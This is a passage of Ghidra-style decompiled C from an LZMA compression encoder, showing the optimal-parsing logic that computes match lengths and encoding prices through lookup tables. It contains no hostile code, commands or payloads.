          uVar28 = uVar28 >> 1;
        } while (iVar14 != 0);
        *(int *)(param_1 + 0x10e80 + uVar46 * 4) = iVar49;
        uVar46 = uVar46 + 1;
      } while (uVar46 != 0x10);
      *(undefined4 *)(param_1 + 0x10ec0) = 0;
    }
    uVar41 = lzma_range_match_distance(param_2,&local_5c,param_1 + 0x2dc);
  }
  else {
    local_5c = *(uint *)(param_1 + 0xb6c);
    uVar41 = *(uint *)(param_1 + 0xb70);
  }
  uVar39 = (*(int *)((long)param_2 + 0x24) + 1) - *(uint *)(param_2 + 3);
  if (uVar39 < 0x111) {
    if (1 < uVar39) goto LAB_0011aed7;
  }
  else {
    uVar39 = 0x111;
LAB_0011aed7:
    uVar36 = 0;
    uVar46 = 0;
    uVar28 = 0;
    lVar43 = (ulong)*(uint *)(param_2 + 3) + *param_2;
    sVar12 = *(short *)(lVar43 - 1);
    do {
      psVar17 = (short *)(~(ulong)*(uint *)(param_1 + 0x2cc + uVar36 * 4) + lVar43 - 1);
      if (sVar12 == *psVar17) {
        uVar25 = 2;
        if (uVar39 != 2) {
LAB_0011c35d:
          uVar37 = *(long *)(lVar43 - 1 + uVar25) - *(long *)((long)psVar17 + uVar25);
          if (uVar37 == 0) goto LAB_0011c350;
          uVar15 = 0;
          for (; (uVar37 & 1) == 0; uVar37 = uVar37 >> 1 | 0x8000000000000000) {
            uVar15 = uVar15 + 1;
          }
          uVar15 = (uVar15 >> 3) + (int)uVar25;
          if (uVar39 < uVar15) {
            uVar15 = uVar39;
          }
          goto LAB_0011c37f;
        }
        uVar15 = 2;
LAB_0011c37f:
        *(uint *)((long)&local_58 + uVar36 * 4) = uVar15;
        if (*(uint *)((long)&local_58 + uVar28 * 4) < uVar15) {
          uVar28 = uVar36 & 0xffffffff;
          uVar46 = uVar28;
        }
      }
      else {
        *(undefined4 *)((long)&local_58 + uVar36 * 4) = 0;
      }
      uVar36 = uVar36 + 1;
    } while (uVar36 != 4);
    local_134 = *(uint *)((long)&local_58 + uVar28 * 4);
    if (uVar29 <= local_134) {
      *param_3 = (int)uVar46;
      *param_4 = local_134;
      iVar14 = local_134 - 1;
      if (iVar14 != 0) {
        (*(code *)param_2[7])(param_2,iVar14);
        *(int *)((long)param_2 + 0x1c) = *(int *)((long)param_2 + 0x1c) + iVar14;
      }
      goto LAB_0011ae52;
    }
    if (uVar29 <= uVar41) {
      *param_3 = *(int *)(param_1 + 0x2e0 + (ulong)(local_5c - 1) * 8) + 4;
      *param_4 = uVar41;
      iVar14 = uVar41 - 1;
      if (iVar14 != 0) {
        (*(code *)param_2[7])(param_2,iVar14);
        *(int *)((long)param_2 + 0x1c) = *(int *)((long)param_2 + 0x1c) + iVar14;
      }
      goto LAB_0011ae52;
    }
    uVar29 = *(uint *)(param_1 + 0x2cc);
    cVar6 = *(char *)(lVar43 - 1);
    cVar7 = *(char *)(lVar43 - 1 + ~(ulong)uVar29);
    if ((1 < uVar41 || cVar6 == cVar7) || 1 < local_134) {
      uVar39 = *(uint *)(param_1 + 0x2c8);
      uVar46 = (ulong)(param_5 & *(uint *)(param_1 + 0xb78));
      *(uint *)(param_1 + 0x10ecc) = uVar39;
      lVar26 = param_1 + ((ulong)uVar39 * 0x10 + uVar46) * 2;
      uVar15 = (uint)(*(ushort *)(lVar26 + 0x6b84) >> 4);
      iVar14 = lzma_decode_huffman_symbol
                         (param_1,param_5,*(undefined1 *)(lVar43 - 2),6 < uVar39,cVar7,cVar6);
      lVar43 = param_1 + (ulong)uVar39 * 2;
      *(undefined4 *)(param_1 + 0x10f10) = 0xffffffff;
      *(undefined1 *)(param_1 + 0x10efc) = 0;
      bVar8 = (&prob_price_table)[uVar15 & 0xfff];
      bVar9 = (&prob_price_table)[(uVar15 ^ 0x7f) & 0xfff];
      *(uint *)(param_1 + 0x10f08) = iVar14 + (uint)bVar8;
      uVar38 = *(ushort *)(lVar43 + 0x6d04) >> 4;
      iVar49 = (uint)(byte)(&prob_price_table)[uVar38 ^ 0x7f] + (uint)bVar9;
      if ((cVar6 == cVar7) &&
         (uVar39 = (uint)(byte)(&prob_price_table)[*(ushort *)(lVar43 + 0x6d1c) >> 4] +
                   (uint)(byte)(&prob_price_table)[*(ushort *)(lVar26 + 0x6d64) >> 4] + iVar49,
         uVar39 < iVar14 + (uint)bVar8)) {
        *(uint *)(param_1 + 0x10f08) = uVar39;
        *(undefined4 *)(param_1 + 0x10f10) = 0;
      }
      if (local_134 < uVar41) {
        local_134 = uVar41;
      }
      if (local_134 < 2) {
        *param_3 = *(int *)(param_1 + 0x10f10);
        *param_4 = 1;
      }
      else {
        *(undefined4 *)(param_1 + 0x10f0c) = 0;
        *(uint *)(param_1 + 0x10ee8) = uVar29;
        *(undefined4 *)(param_1 + 0x10eec) = *(undefined4 *)(param_1 + 0x2d0);
        *(undefined8 *)(param_1 + 0x10ef0) = *(undefined8 *)(param_1 + 0x2d4);
        lVar18 = param_1 + (ulong)local_134 * 0x2c;
        do {
          *(undefined4 *)(lVar18 + 0x10edc) = 0x40000000;
          lVar18 = lVar18 - 0x2c;
        } while (param_1 - 0x2c + (ulong)local_134 * 0x2c + (ulong)(local_134 - 2) * -0x2c !=
                 lVar18);
        lVar18 = 0;
        do {
          iVar14 = (int)lVar18;
          uVar29 = *(uint *)((long)&local_58 + lVar18 * 4);
          if (1 < uVar29) {
            uVar39 = (uint)(*(ushort *)(lVar43 + 0x6d1c) >> 4);
            if (lVar18 == 0) {
              iVar33 = (uint)(byte)(&prob_price_table)[*(ushort *)(lVar26 + 0x6d64) >> 4 ^ 0x7f] +
                       (uint)(byte)(&prob_price_table)[uVar39];
            }
            else {
              uVar15 = (uint)(*(ushort *)(lVar43 + 0x6d34) >> 4);
              if (iVar14 == 1) {
                iVar33 = (uint)(byte)(&prob_price_table)[uVar15] +
                         (uint)(byte)(&prob_price_table)[uVar39 ^ 0x7f];
              }
              else {
                iVar33 = (uint)(byte)(&prob_price_table)
                                     [(2U - iVar14 & 0x7ff ^ (uint)*(ushort *)(lVar43 + 0x6d4c)) >>
                                      4] +
                         (uint)(byte)(&prob_price_table)[uVar39 ^ 0x7f] +
                         (uint)(byte)(&prob_price_table)[uVar15 ^ 0x7f];
              }
            }
            uVar39 = uVar29 - 2;
            lVar19 = param_1 + (ulong)uVar29 * 0x2c;
            do {
              uVar29 = *(int *)(param_1 + 0xba34 + ((ulong)uVar39 + 0x100 + uVar46 * 0x110) * 4) +
                       iVar33 + iVar49;
              if (uVar29 < *(uint *)(lVar19 + 0x10edc)) {
                *(uint *)(lVar19 + 0x10edc) = uVar29;
                *(undefined4 *)(lVar19 + 0x10ee0) = 0;
                *(int *)(lVar19 + 0x10ee4) = iVar14;
                *(undefined1 *)(lVar19 + 0x10ed0) = 0;
              }
              uVar39 = uVar39 - 1;
              lVar19 = lVar19 - 0x2c;
            } while (uVar39 != 0xffffffff);
          }
          lVar18 = lVar18 + 1;
        } while (lVar18 != 4);
        iVar14 = 1;
        if ((int)local_58 != 0) {
          iVar14 = (int)local_58;
        }
        uVar29 = iVar14 + 1;
        if (uVar29 <= uVar41) {
          if (*(uint *)(param_1 + 0x2dc) < uVar29) {
            uVar36 = 1;
            do {
              uVar28 = uVar36 & 0xffffffff;
              uVar36 = uVar36 + 1;
            } while (*(uint *)(param_1 + 0x2d4 + uVar36 * 8) < uVar29);
          }
          else {
            uVar28 = 0;
          }
          bVar8 = (&prob_price_table)[uVar38];
          uVar36 = uVar28;
          do {
            lVar43 = param_1 + uVar36 * 8;
            uVar41 = 5;
            if (uVar29 < 6) {
              uVar41 = uVar29;
            }
            uVar39 = *(uint *)(lVar43 + 0x2e0);
            if (uVar39 < 0x80) {
              iVar14 = *(int *)(param_1 + 8 +
                               ((ulong)uVar39 + 0x419c + (ulong)(uVar41 - 2) * 0x80) * 4);
            }
            else {
              if (uVar39 < 0x80000) {
                uVar25 = (ulong)((byte)(&dist_slot_log2_table)[uVar39 >> 6] + 0xc);
              }
              else if ((int)uVar39 < 0) {
                uVar25 = (ulong)((byte)(&dist_slot_log2_table)[uVar39 >> 0x1e] + 0x3c);
              }
              else {
                uVar25 = (ulong)((byte)(&dist_slot_log2_table)[uVar39 >> 0x12] + 0x24);
              }
              iVar14 = *(int *)(param_1 + 0x10e80 + (ulong)(uVar39 & 0xf) * 4) +
                       *(int *)(param_1 + 8 + (uVar25 + 0x409c + (ulong)(uVar41 - 2) * 0x40) * 4);
            }
            uVar41 = *(int *)(param_1 + 0x71ec + ((ulong)(uVar29 - 2) + 0x100 + uVar46 * 0x110) * 4)
                     + (uint)bVar8 + (uint)bVar9 + iVar14;
            lVar26 = param_1 + (ulong)uVar29 * 0x2c;
            if (uVar41 < *(uint *)(lVar26 + 0x10edc)) {
              *(uint *)(lVar26 + 0x10edc) = uVar41;
              *(undefined4 *)(lVar26 + 0x10ee0) = 0;
              *(uint *)(lVar26 + 0x10ee4) = uVar39 + 4;
              *(undefined1 *)(lVar26 + 0x10ed0) = 0;
            }
            if (uVar29 == *(uint *)(lVar43 + 0x2dc)) {
              uVar41 = (int)uVar28 + 1;
              uVar28 = (ulong)uVar41;
              if (local_5c == uVar41) break;
              uVar36 = (ulong)uVar41;
            }
            uVar29 = uVar29 + 1;
          } while( true );
        }
        if (local_134 != 0xffffffff) {
          local_138 = 1;
          local_58 = *(ulong *)(param_1 + 0x2cc);
          uStack_50 = *(undefined8 *)(param_1 + 0x2d4);
          lVar43 = param_1 + 0x10f08;
LAB_0011b228:
          local_10c = lzma_range_match_distance(param_2,param_1 + 0xb6c,param_1 + 0x2dc);
          uVar29 = *(uint *)(param_2 + 0xc);
          *(uint *)(param_1 + 0xb70) = local_10c;
          if (local_10c < uVar29) {
            uVar39 = (*(int *)((long)param_2 + 0x24) + 1) - *(uint *)(param_2 + 3);
            uVar41 = 0xfff - local_138;
            if (uVar39 <= 0xfff - local_138) {
              uVar41 = uVar39;
            }
            uVar15 = param_5 + local_138;
            psVar17 = (short *)(*param_2 - 1 + (ulong)*(uint *)(param_2 + 3));
            local_fc = *(uint *)(param_1 + 0xb6c);
            uVar46 = (ulong)local_138;
            lVar26 = param_1 + uVar46 * 0x2c;
            uVar39 = *(uint *)(lVar26 + 0x10ee0);
            uVar21 = local_58._4_4_;
            uVar40 = (undefined4)uStack_50;
            uVar34 = uStack_50._4_4_;
            if (*(char *)(lVar26 + 0x10ed0) == '\0') {
              uVar28 = (ulong)uVar39;
              uVar30 = *(uint *)(lVar26 + 0x10ee4);
              uVar31 = *(uint *)(param_1 + 0x10ecc + uVar28 * 0x2c);
              if (uVar39 == local_138 - 1) goto LAB_0011c256;
LAB_0011c096:
              if (3 < uVar30) {
                if (uVar31 < 7) goto LAB_0011c2d1;
                local_110 = 10;
                goto LAB_0011c2d9;
              }
              local_110 = 0xb;
              if (uVar31 < 7) goto LAB_0011b303;
LAB_0011b30b:
              uVar39 = *(uint *)(param_1 + 0x18 + ((ulong)uVar30 + 0x43b4 + uVar28 * 0xb) * 4);
              uVar36 = (ulong)uVar39;
              local_58 = CONCAT44(local_58._4_4_,uVar39);
              if (uVar30 == 0) {
                uVar36 = 1;
              }
              else {
                lVar26 = param_1 + uVar28 * 0x2c;
                uVar21 = *(undefined4 *)(lVar26 + 0x10ee8);
                local_58 = CONCAT44(uVar21,uVar39);
                if (uVar30 != 1) {
                  uVar40 = *(undefined4 *)(lVar26 + 0x10eec);
                  if (uVar30 == 3) {
                    uStack_50 = CONCAT44(*(undefined4 *)(lVar26 + 0x10ef0),uVar40);
                    uVar34 = *(undefined4 *)(lVar26 + 0x10ef0);
                  }
                  else {
                    uStack_50 = CONCAT44(*(undefined4 *)(lVar26 + 0x10ef4),uVar40);
                    uVar34 = *(undefined4 *)(lVar26 + 0x10ef4);
                  }
                  goto LAB_0011b380;
                }
                uVar36 = 2;
              }
              do {
                *(undefined4 *)((long)&local_58 + uVar36 * 4) =
                     *(undefined4 *)
                      (param_1 + 0x18 + ((uVar36 & 0xffffffff) + 0x43b4 + uVar28 * 0xb) * 4);
                uVar36 = uVar36 + 1;
              } while ((int)uVar36 != 4);
              uVar36 = local_58 & 0xffffffff;
              uVar21 = local_58._4_4_;
            }
            else {
              uVar28 = (ulong)(uVar39 - 1);
              if (*(char *)(lVar26 + 0x10ed1) == '\0') {
                uVar30 = *(uint *)(param_1 + 0x10ecc + uVar28 * 0x2c);
                if (3 < uVar30) {
                  uVar31 = uVar30 - 6;
                  if (uVar30 < 10) {
                    uVar31 = uVar30 - 3;
                  }
                  if (uVar39 != local_138) {
                    uVar30 = *(uint *)(lVar26 + 0x10ee4);
                    goto LAB_0011c096;
                  }
LAB_0011c246:
                  uVar30 = *(uint *)(param_1 + 0x10ee4 + uVar46 * 0x2c);
                  goto LAB_0011c256;
                }
                uVar30 = *(uint *)(lVar26 + 0x10ee4);
                if (uVar39 == local_138) {
                  uVar36 = local_58 & 0xffffffff;
                  local_110 = -(uint)(uVar30 == 0) & 9;
                  goto LAB_0011b380;
                }
                if (uVar30 < 4) goto LAB_0011b303;
LAB_0011c2d1:
                local_110 = 7;
              }
              else {
                uVar28 = (ulong)*(uint *)(lVar26 + 0x10ed4);
                uVar30 = *(uint *)(lVar26 + 0x10ed8);
                if (uVar30 < 4) {
                  if (uVar39 != local_138) {
LAB_0011b303:
                    local_110 = 8;
                    goto LAB_0011b30b;
                  }
                  uVar31 = 5;
                  uVar30 = *(uint *)(param_1 + 0x10ee4 + uVar46 * 0x2c);
LAB_0011c256:
                  uVar36 = local_58 & 0xffffffff;
                  if (uVar30 == 0) {
                    local_110 = (-(uint)(uVar31 < 7) & 0xfffffffe) + 0xb;
                  }
                  else if (uVar31 < 4) {
                    local_110 = 0;
                  }
                  else if (uVar31 < 10) {
                    local_110 = uVar31 - 3;
                  }
                  else {
                    local_110 = uVar31 - 6;
                  }
                  goto LAB_0011b380;
                }
                if (uVar39 == local_138) {
                  uVar31 = 4;
                  goto LAB_0011c246;
                }
                local_110 = 8;
              }
LAB_0011c2d9:
              uVar36 = (ulong)(uVar30 - 4);
              lVar26 = param_1 + uVar28 * 0x2c;
              uStack_50 = *(undefined8 *)(lVar26 + 0x10eec);
              local_58 = CONCAT44(*(undefined4 *)(lVar26 + 0x10ee8),uVar30 - 4);
              uVar21 = *(undefined4 *)(lVar26 + 0x10ee8);
              uVar40 = *(undefined4 *)(lVar26 + 0x10eec);
              uVar34 = *(undefined4 *)(lVar26 + 0x10ef0);
            }
LAB_0011b380:
            lVar26 = param_1 + uVar46 * 0x2c;
            *(undefined4 *)(lVar26 + 0x10eec) = uVar21;
            *(undefined4 *)(lVar26 + 0x10ef0) = uVar40;
            *(undefined4 *)(lVar26 + 0x10ef4) = uVar34;
            *(uint *)(lVar26 + 0x10ecc) = local_110;
            *(int *)(lVar26 + 0x10ee8) = (int)uVar36;
            iVar14 = *(int *)(lVar26 + 0x10edc);
            uVar28 = (ulong)(uVar15 & *(uint *)(param_1 + 0xb78));
            sVar12 = *psVar17;
            cVar6 = *(char *)((long)psVar17 + ~uVar36);
            lVar26 = param_1 + ((ulong)local_110 * 0x10 + uVar28) * 2;
            uVar31 = (uint)(*(ushort *)(lVar26 + 0x6b84) >> 4);
            iVar49 = lzma_decode_huffman_symbol(param_1,uVar15,*(char *)((long)psVar17 - 1));
            local_114 = local_138 + 1;
            uVar46 = (ulong)local_114;
            uVar39 = iVar49 + iVar14 + (uint)(byte)(&prob_price_table)[uVar31 & 0xfff];
            lVar18 = param_1 + uVar46 * 0x2c;
            bVar51 = uVar39 < *(uint *)(lVar18 + 0x10edc);
            if (bVar51) {
              lVar19 = param_1 + 0x10ecc + uVar46 * 0x2c;
              *(uint *)(lVar18 + 0x10edc) = uVar39;
              *(uint *)(lVar18 + 0x10ee0) = local_138;
              *(undefined4 *)(lVar19 + 0x18) = 0xffffffff;
              *(undefined1 *)(lVar19 + 4) = 0;
            }
            lVar18 = param_1 + (ulong)local_110 * 2;
            uVar38 = *(ushort *)(lVar18 + 0x6d04) >> 4;
            iVar14 = iVar14 + (uint)(byte)(&prob_price_table)[(uVar31 ^ 0x7f) & 0xfff];
            iVar49 = (uint)(byte)(&prob_price_table)[uVar38 ^ 0x7f] + iVar14;
            uVar31 = uVar41;
            if ((char)sVar12 == cVar6) {
              lVar19 = param_1 + uVar46 * 0x2c;
              if ((local_138 <= *(uint *)(lVar19 + 0x10ee0)) || (*(int *)(lVar19 + 0x10ee4) != 0)) {
                uVar39 = (uint)(byte)(&prob_price_table)[*(ushort *)(lVar18 + 0x6d1c) >> 4] +
                         (uint)(byte)(&prob_price_table)[*(ushort *)(lVar26 + 0x6d64) >> 4] + iVar49;
                lVar19 = param_1 + uVar46 * 0x2c;
                if (uVar39 <= *(uint *)(lVar19 + 0x10edc)) {
                  *(uint *)(lVar19 + 0x10edc) = uVar39;
                  *(uint *)(lVar19 + 0x10ee0) = local_138;
                  lVar19 = param_1 + 0x10ecc + uVar46 * 0x2c;
                  *(undefined4 *)(lVar19 + 0x18) = 0;
                  *(undefined1 *)(lVar19 + 4) = 0;
                }
              }
              if (1 < uVar41) {
                if (uVar29 <= uVar41) {
                  uVar31 = uVar29;
                }
                goto LAB_0011b6c0;
              }
            }
            else if (1 < uVar41) {
              if (uVar29 <= uVar41) {
                uVar31 = uVar29;
              }
              if (!bVar51) {
                uVar30 = uVar29 + 1;
                if (uVar41 < uVar29 + 1) {
                  uVar30 = uVar41;
                }
                if (1 < uVar30) {
                  uVar24 = 1;
LAB_0011b537:
                  uVar25 = *(long *)((long)psVar17 + (ulong)uVar24) -
                           *(long *)((long)psVar17 + (ulong)uVar24 + ~uVar36);
                  if (uVar25 == 0) goto LAB_0011b530;
                  uVar32 = 0;
                  for (; (uVar25 & 1) == 0; uVar25 = uVar25 >> 1 | 0x8000000000000000) {
                    uVar32 = uVar32 + 1;
                  }
                  uVar24 = (uVar32 >> 3) + uVar24;
                  if (uVar24 < uVar30) {
                    uVar30 = uVar24;
                  }
                }
LAB_0011b553:
                if (1 < uVar30 - 1) {
                  uVar25 = 0;
                  if (3 < local_110) {
                    uVar25 = (ulong)(local_110 - 6);
                    if (local_110 < 10) {
                      uVar25 = (ulong)(local_110 - 3);
                    }
                  }
                  lVar19 = param_1 + uVar25 * 2;
                  uVar37 = (ulong)(param_5 + local_114 & *(uint *)(param_1 + 0xb78));
                  uVar24 = (uVar30 - 1) + local_114;
                  lVar3 = param_1 + (uVar25 * 0x10 + uVar37) * 2;
                  bVar8 = (&prob_price_table)[*(ushort *)(lVar3 + 0x6b84) >> 4 ^ 0x7f];
                  bVar9 = (&prob_price_table)[*(ushort *)(lVar19 + 0x6d04) >> 4 ^ 0x7f];
                  if (local_134 < uVar24) {
                    uVar32 = local_134 + 1;
                    uVar22 = ~local_134;
                    puVar20 = (undefined4 *)(param_1 + 0x10edc + (ulong)uVar32 * 0x2c);
                    do {
                      *puVar20 = 0x40000000;
                      puVar20 = puVar20 + 0xb;
                      local_134 = uVar24;
                    } while ((undefined4 *)
                             (lVar43 + ((ulong)(uVar22 + uVar24) + (ulong)uVar32) * 0x2c) != puVar20
                            );
                  }
                  lVar4 = param_1 + (ulong)uVar24 * 0x2c;
                  uVar39 = (uint)bVar8 +
                           uVar39 + *(int *)(param_1 + 0xba34 +
                                            ((ulong)(uVar30 - 3) + 0x100 + uVar37 * 0x110) * 4) +
                           (uint)(byte)(&prob_price_table)[*(ushort *)(lVar19 + 0x6d1c) >> 4] +
                           (uint)bVar9 +
                           (uint)(byte)(&prob_price_table)[*(ushort *)(lVar3 + 0x6d64) >> 4 ^ 0x7f];
                  if (uVar39 < *(uint *)(lVar4 + 0x10edc)) {
                    *(uint *)(lVar4 + 0x10edc) = uVar39;
                    *(undefined4 *)(lVar4 + 0x10ee4) = 0;
                    *(uint *)(lVar4 + 0x10ee0) = local_114;
                    *(undefined2 *)(lVar4 + 0x10ed0) = 1;
                  }
                }
              }
LAB_0011b6c0:
              uVar25 = 2;
              uVar30 = -(uint)(local_110 < 7) & 0xfffffffd;
              uVar39 = uVar30 + 5;
              if (uVar30 + 0xb < 10) {
                uVar39 = uVar30 + 8;
              }
              lVar19 = 0;
LAB_0011b70a:
              iVar33 = (int)lVar19;
              psVar5 = (short *)((long)psVar17 + ~uVar36);
              if (*psVar17 == *psVar5) {
                if (2 < uVar31) {
                  uVar24 = 2;
LAB_0011b7c4:
                  uVar36 = *(long *)((long)psVar17 + (ulong)uVar24) -
                           *(long *)((long)psVar5 + (ulong)uVar24);
                  if (uVar36 == 0) goto LAB_0011b7b8;
                  uVar32 = 0;
                  for (; (uVar36 & 1) == 0; uVar36 = uVar36 >> 1 | 0x8000000000000000) {
                    uVar32 = uVar32 + 1;
                  }
                  uVar24 = (uVar32 >> 3) + uVar24;
                  uVar36 = (ulong)uVar24;
                  if (uVar31 < uVar24) {
                    uVar36 = (ulong)uVar31;
                  }
                  goto LAB_0011b7e3;
                }
LAB_0011c0d8:
                uVar36 = (ulong)uVar31;
LAB_0011b7e3:
                iVar16 = (int)uVar36;
                uVar24 = iVar16 + local_138;
                if (local_134 < uVar24) {
                  uVar32 = local_134 + 1;
                  uVar22 = ~local_134;
                  puVar20 = (undefined4 *)(param_1 + 0x10edc + (ulong)uVar32 * 0x2c);
                  do {
                    *puVar20 = 0x40000000;
                    puVar20 = puVar20 + 0xb;
                    local_134 = uVar24;
                  } while ((undefined4 *)
                           (lVar43 + ((ulong)(uVar22 + uVar24) + (ulong)uVar32) * 0x2c) != puVar20);
                }
                uVar32 = (uint)(*(ushort *)(lVar18 + 0x6d1c) >> 4);
                if (lVar19 == 0) {
                  iVar47 = (uint)(byte)(&prob_price_table)[*(ushort *)(lVar26 + 0x6d64) >> 4 ^ 0x7f] +
                           (uint)(byte)(&prob_price_table)[uVar32];
                }
                else {
                  uVar22 = (uint)(*(ushort *)(lVar18 + 0x6d34) >> 4);
                  if (iVar33 == 1) {
                    iVar47 = (uint)(byte)(&prob_price_table)[uVar22] +
                             (uint)(byte)(&prob_price_table)[uVar32 ^ 0x7f];
                  }
                  else {
                    iVar47 = (uint)(byte)(&prob_price_table)
                                         [(2U - iVar33 & 0x7ff ^ (uint)*(ushort *)(lVar18 + 0x6d4c))
                                          >> 4] +
                             (uint)(byte)(&prob_price_table)[uVar32 ^ 0x7f] +
                             (uint)(byte)(&prob_price_table)[uVar22 ^ 0x7f];
                  }
                }
                iVar47 = iVar47 + iVar49;
                uVar37 = uVar36;
                do {
                  iVar42 = (int)uVar37;
                  uVar32 = *(int *)(param_1 + 0xba34 +
                                   ((ulong)(iVar42 - 2) + 0x100 + uVar28 * 0x110) * 4) + iVar47;
                  lVar3 = param_1 + (ulong)(iVar42 + local_138) * 0x2c;
                  if (uVar32 < *(uint *)(lVar3 + 0x10edc)) {
                    *(uint *)(lVar3 + 0x10edc) = uVar32;
                    *(uint *)(lVar3 + 0x10ee0) = local_138;
                    *(int *)(lVar3 + 0x10ee4) = iVar33;
                    *(undefined1 *)(lVar3 + 0x10ed0) = 0;
                  }
                  uVar37 = (ulong)(iVar42 - 1U);
                } while (1 < iVar42 - 1U);
                uVar32 = iVar16 + 1;
                if (lVar19 == 0) {
                  uVar25 = (ulong)uVar32;
                }
                uVar22 = uVar29 + uVar32;
                if (uVar41 < uVar29 + uVar32) {
                  uVar22 = uVar41;
                }
                if (uVar32 < uVar22) {
LAB_0011b928:
                  uVar37 = *(long *)((long)psVar17 + (ulong)uVar32) -
                           *(long *)((long)psVar5 + (ulong)uVar32);
                  if (uVar37 == 0) goto code_r0x0011b93a;
                  uVar45 = 0;
                  for (; (uVar37 & 1) == 0; uVar37 = uVar37 >> 1 | 0x8000000000000000) {
                    uVar45 = uVar45 + 1;
                  }
                  uVar32 = uVar32 + (uVar45 >> 3);
                  if (uVar22 < uVar32) {
                    uVar32 = uVar22;
                  }
                  iVar42 = uVar32 - iVar16;
                  goto LAB_0011b951;
                }
              }
              goto joined_r0x0011bb9b;
            }
            goto LAB_0011b780;
          }
          local_114 = local_138;
          uVar46 = (ulong)local_138;
          goto LAB_0011c588;
        }
      }
      goto LAB_0011ae52;
    }
  }
  *param_3 = -1;
  *param_4 = 1;
LAB_0011ae52:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
LAB_0011c350:
  uVar31 = (int)uVar25 + 8;
  uVar25 = (ulong)uVar31;
  uVar15 = uVar39;
  if (uVar39 <= uVar31) goto LAB_0011c37f;
  goto LAB_0011c35d;
LAB_0011b530:
  uVar24 = uVar24 + 8;
  if (uVar30 <= uVar24) goto LAB_0011b553;
  goto LAB_0011b537;
LAB_0011b7b8:
  uVar24 = uVar24 + 8;
  if (uVar31 <= uVar24) goto LAB_0011c0d8;
  goto LAB_0011b7c4;
code_r0x0011b93a:
  uVar32 = uVar32 + 8;
  if (uVar22 <= uVar32) goto code_r0x0011b942;
  goto LAB_0011b928;
code_r0x0011b942:
  iVar42 = uVar22 - iVar16;
LAB_0011b951:
  if (1 < iVar42 - 1U) {
    uVar32 = *(uint *)(param_1 + 0xb78);
    iVar13 = *(int *)(param_1 + 0xba34 + ((ulong)(iVar16 - 2) + 0x100 + uVar28 * 0x110) * 4);
    uVar22 = uVar15 + iVar16;
    bVar8 = (&prob_price_table)
            [*(ushort *)
              (param_1 + 4 + ((ulong)(uVar22 & uVar32) + 0x35c0 + (ulong)(uVar30 + 0xb) * 0x10) * 2)
             >> 4];
    iVar16 = lzma_decode_huffman_symbol
                       (param_1,uVar22,*(char *)((long)psVar17 + (ulong)(iVar16 - 1)),1,
                        *(char *)((long)psVar5 + uVar36),*(char *)((long)psVar17 + uVar36));
    uVar36 = (ulong)(uVar32 & uVar22 + 1);
    lVar3 = param_1 + (ulong)uVar39 * 2;
    lVar4 = param_1 + ((ulong)uVar39 * 0x10 + uVar36) * 2;
    bVar9 = (&prob_price_table)[*(ushort *)(lVar4 + 0x6b84) >> 4 ^ 0x7f];
    bVar10 = (&prob_price_table)[*(ushort *)(lVar3 + 0x6d04) >> 4 ^ 0x7f];
    uVar32 = (iVar42 - 1U) + uVar24 + 1;
    if (local_134 < uVar32) {
      uVar22 = local_134 + 1;
      uVar45 = ~local_134;
      puVar20 = (undefined4 *)(param_1 + 0x10edc + (ulong)uVar22 * 0x2c);
      do {
        *puVar20 = 0x40000000;
        puVar20 = puVar20 + 0xb;
        local_134 = uVar32;
      } while ((undefined4 *)(lVar43 + ((ulong)(uVar45 + uVar32) + (ulong)uVar22) * 0x2c) != puVar20
              );
    }
    uVar22 = iVar47 + (uint)bVar10 + (uint)(byte)(&prob_price_table)[*(ushort *)(lVar3 + 0x6d1c) >> 4] +
                      iVar13 + (uint)bVar8 + (uint)bVar9 +
                      (uint)(byte)(&prob_price_table)[*(ushort *)(lVar4 + 0x6d64) >> 4 ^ 0x7f] +
             *(int *)(param_1 + 0xba34 + ((ulong)(iVar42 - 3) + 0x100 + uVar36 * 0x110) * 4) +
             iVar16;
    lVar3 = param_1 + (ulong)uVar32 * 0x2c;
    if (uVar22 < *(uint *)(lVar3 + 0x10edc)) {
      *(uint *)(lVar3 + 0x10edc) = uVar22;
      *(undefined4 *)(lVar3 + 0x10ee4) = 0;
      *(uint *)(lVar3 + 0x10ee0) = uVar24 + 1;
      *(undefined2 *)(lVar3 + 0x10ed0) = 0x101;
      *(uint *)(lVar3 + 0x10ed4) = local_138;
      *(int *)(lVar3 + 0x10ed8) = iVar33;
    }
  }
joined_r0x0011bb9b:
  if (lVar19 == 3) goto LAB_0011bba8;
  lVar19 = lVar19 + 1;
  uVar36 = (ulong)*(uint *)((long)&local_58 + lVar19 * 4);
  goto LAB_0011b70a;
LAB_0011bba8:
  if (uVar31 < local_10c) {
    if (*(uint *)(param_1 + 0x2dc) < uVar31) {
      uVar37 = 1;
      do {
        uVar27 = uVar37;
        uVar36 = uVar27 & 0xffffffff;
        uVar37 = uVar27 + 1;
      } while (*(uint *)(param_1 + 0x2d4 + (uVar27 + 1) * 8) < uVar31);
      local_fc = (int)uVar27 + 1;
    }
    else {
      local_fc = 1;
      uVar36 = 0;
    }
    *(uint *)(param_1 + 0x2dc + uVar36 * 8) = uVar31;
    local_10c = uVar31;
  }
  uVar39 = (uint)uVar25;
  if (uVar39 <= local_10c) {
    bVar8 = (&prob_price_table)[uVar38];
    local_10c = local_138 + local_10c;
    if (local_134 < local_10c) {
      uVar31 = local_134 + 1;
      uVar30 = ~local_134;
      puVar20 = (undefined4 *)(param_1 + 0x10edc + (ulong)uVar31 * 0x2c);
      do {
        *puVar20 = 0x40000000;
        puVar20 = puVar20 + 0xb;
        local_134 = local_10c;
      } while ((undefined4 *)(lVar43 + ((ulong)(uVar30 + local_10c) + (ulong)uVar31) * 0x2c) !=
               puVar20);
    }
    if (*(uint *)(param_1 + 0x2dc) < uVar39) {
      lVar26 = 1;
      do {
        lVar18 = lVar26;
        lVar26 = lVar18 + 1;
      } while (*(uint *)(param_1 + 0x2d4 + lVar26 * 8) < uVar39);
      local_128 = (uint)lVar18;
    }
    else {
      local_128 = 0;
    }
    uVar36 = (ulong)local_128;
    uVar31 = -(uint)(local_110 < 7) & 0xfffffffd;
    uVar30 = uVar31 + 10;
    uVar39 = 4;
    if (uVar30 != 10) {
      uVar39 = uVar31 + 7;
    }
    do {
      uVar31 = (uint)uVar25;
      lVar26 = param_1 + uVar36 * 8;
      uVar37 = 5;
      if (uVar31 < 6) {
        uVar37 = uVar25;
      }
      uVar24 = *(uint *)(lVar26 + 0x2e0);
      uVar37 = (ulong)((int)uVar37 - 2);
      if (uVar24 < 0x80) {
        iVar49 = *(int *)(param_1 + 8 + ((ulong)uVar24 + 0x419c + uVar37 * 0x80) * 4);
      }
      else {
